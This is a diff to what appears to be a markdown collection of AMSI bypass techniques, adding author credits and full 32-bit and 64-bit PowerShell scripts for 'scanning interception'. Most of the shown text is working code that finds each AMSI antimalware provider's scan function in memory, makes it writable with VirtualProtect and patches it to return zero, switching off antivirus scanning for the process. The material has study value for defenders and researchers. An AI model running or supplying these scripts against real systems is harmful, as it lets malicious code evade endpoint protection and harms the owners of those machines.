@@ -22,7 +22,7 @@ Most of the scripts are detected by AMSI itself. So you have to find the [trigge
 17. [Modified version of 3. Amsi ScanBuffer - no CSC.exe compilation](#Modified-Amsi-ScanBuffer-Patch "Goto Modified-Amsi-ScanBuffer-Patch")
 
 # Patch the providers DLL of Microsoft MpOav.dll #
-- Source: [https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf](https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf)
+- Source: [https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf](https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf), author: Maor Korkos (@maorkor)
 
 ## With Add-Type
 
@@ -140,41 +140,99 @@ $Uninitialize.Invoke($object,$null)
 
 # Scanning Interception
 
-- Source: [https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf](https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf)
+- Source: [https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf](https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf), author: Maor Korkos (@maorkor)
 
 ## 32 Bit (Powershell x86 only)
 ```
+Write-Host "AMSI providers' scan interception"
+Write-Host "-- Maor Korkos (@maorkor)"
+Write-Host "-- 32bit implemetation"
+
 $APIs = @"
 using System;
 using System.Runtime.InteropServices;
 public class APIs {
-    [DllImport("amsi")]
-public static extern int AmsiInitialize(string appName, out IntPtr context);
-    [DllImport("kernel32")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ekwiam, uint flNewProtect, out uint lpflOldProtect);
+  [DllImport("kernel32")]
+  public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+  [DllImport("amsi")]
+  public static extern int AmsiInitialize(string appName, out IntPtr context);
 }
 "@
-
 Add-Type $APIs
 
-$SIZE_OF_PTR = 4; $NUM_OF_PROVIDERS = 1; $ctx = 0; $p = 0
+# Declare varaibles
+$SIZE_OF_PTR = 4
 $ret_zero = [byte[]] (0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3)
+$ctx = 0; $p = 0; $i = 0
+
+# Calling AmsiInitialize to recieve a new AMS1 Context 
 [APIs]::AmsiInitialize("MyAmsiScanner", [ref]$ctx)
-for ($i = 0; $i -lt $NUM_OF_PROVIDERS; $i++)
-{
+Write-host "AMS1 context:" $ctx
+
+# Find the AntiMalwareProviders list in CAmsiAntimalware
 $CAmsiAntimalware = [System.Runtime.InteropServices.Marshal]::ReadInt32($ctx+8)
-$AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt32($CAmsiAntimalware+36+($i*$SIZE_OF_PTR))
-$AntimalwareProviderVtbl = [System.Runtime.InteropServices.Marshal]::ReadInt32($AntimalwareProvider)
-$AmsiProviderScanFunc = [System.Runtime.InteropServices.Marshal]::ReadInt32($AntimalwareProviderVtbl+12)
-[APIs]::VirtualProtect($AmsiProviderScanFunc, [uint32]6, 0x40, [ref]$p)
-[System.Runtime.InteropServices.Marshal]::Copy($ret_zero, 0, $AmsiProviderScanFunc, 6)
+$AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt32($CAmsiAntimalware+36)
+
+# Loop through all the providers
+while ($AntimalwareProvider -ne 0)
+{
+  # Find the provider's Scan function
+  $AntimalwareProviderVtbl =  [System.Runtime.InteropServices.Marshal]::ReadInt32($AntimalwareProvider)
+  $AmsiProviderScanFunc = [System.Runtime.InteropServices.Marshal]::ReadInt32($AntimalwareProviderVtbl + 12)
+  
+  # Patch the Scan function
+  Write-host "[$i] Provider's scan function found!" $AmsiProviderScanFunc
+  [APIs]::VirtualProtect($AmsiProviderScanFunc, [uint32]6, 0x40, [ref]$p)
+  [System.Runtime.InteropServices.Marshal]::Copy($ret_zero, 0, $AmsiProviderScanFunc, 6)
+  
+  $i++
+  $AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt32($CAmsiAntimalware+36 + ($i*$SIZE_OF_PTR))
 }
 ```
 
-## 64 Bit (Todo)
+## 64 Bit 
 
 ```
-ToDo
+Write-Host "AMSI providers' scan interception"
+Write-Host "-- Maor Korkos (@maorkor)"
+Write-Host "-- 64bit implemetation"
+
+$Apis = @"
+using System;
+using System.Runtime.InteropServices;
+public class Apis {
+  [DllImport("kernel32")]
+  public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+  [DllImport("amsi")]
+  public static extern int AmsiInitialize(string appName, out Int64 context);
+}
+"@
+Add-Type $Apis
+
+$ret_zero = [byte[]] (0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3)
+$p = 0; $i = 0
+$SIZE_OF_PTR = 8
+[Int64]$ctx = 0
+
+[Apis]::AmsiInitialize("MyScanner", [ref]$ctx)
+$CAmsiAntimalware = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$ctx, 16)
+$AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64)
+
+# Loop through all the providers
+while ($AntimalwareProvider -ne 0)
+{
+  # Find the provider's Scan function
+  $AntimalwareProviderVtbl =  [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProvider)
+  $AmsiProviderScanFunc = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProviderVtbl, 24)
+
+  # Patch the Scan function
+  Write-host "[$i] Provider's scan function found!" $AmsiProviderScanFunc
+  [APIs]::VirtualProtect($AmsiProviderScanFunc, [uint32]6, 0x40, [ref]$p)
+  [System.Runtime.InteropServices.Marshal]::Copy($ret_zero, 0, [IntPtr]$AmsiProviderScanFunc, 6)
+  
+  $i++
+  $AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64 + ($i*$SIZE_OF_PTR))
+}
 ```
 
 # Patching amsi.dll AmsiScanBuffer by rasta-mouse #
